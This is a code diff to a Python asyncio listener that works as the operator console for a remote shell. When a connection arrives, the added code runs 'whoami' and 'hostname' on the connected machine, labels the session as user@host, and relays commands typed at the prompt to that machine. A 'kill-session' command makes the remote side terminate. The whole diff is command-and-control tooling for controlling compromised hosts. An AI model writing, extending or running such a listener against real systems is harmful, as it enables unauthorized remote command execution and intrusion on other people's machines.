@@ -2,6 +2,7 @@ import asyncio
 import signal
 import sys
 import argparse
+import time
 from datetime import datetime
 
 # Global variables
@@ -23,16 +24,36 @@ async def handle_client(reader, writer):
         current_session = client_ip
         current_writer = writer
 
+        # Send initial commands to gather 'whoami' and 'hostname'
+        writer.write(b" whoami\n")
+        await writer.drain()
+        whoami = (await reader.read(4096)).decode('utf-8').strip().replace("EOF", "")
+
+        # sleep 1 before getting hostname
+        time.sleep(1)
+
+        writer.write(b" hostname\n")
+        await writer.drain()
+        hostname = (await reader.read(4096)).decode('utf-8').strip().replace("EOF", "")
+
+        # Construct session identifier and ensure it's a single line
+        session_id = f"{whoami.strip()}@{hostname.strip()}"
+        print(f"[+] Session initialized: {session_id}")
+
         while True:
             try:
-                command = input("\nConquer: ")
+                # Display the prompt and flush to avoid extra newlines
+                sys.stdout.write(f"\n{session_id} > ")
+                sys.stdout.flush()
+                command = input().strip()
+
                 if command.lower() == 'kill-session':
                     print("[!] Terminating session...")
                     writer.write(b"die\n")
                     await writer.drain()
                     break
 
-                if not command.strip():
+                if not command:
                     continue
 
                 writer.write(f"{command}\n".encode())
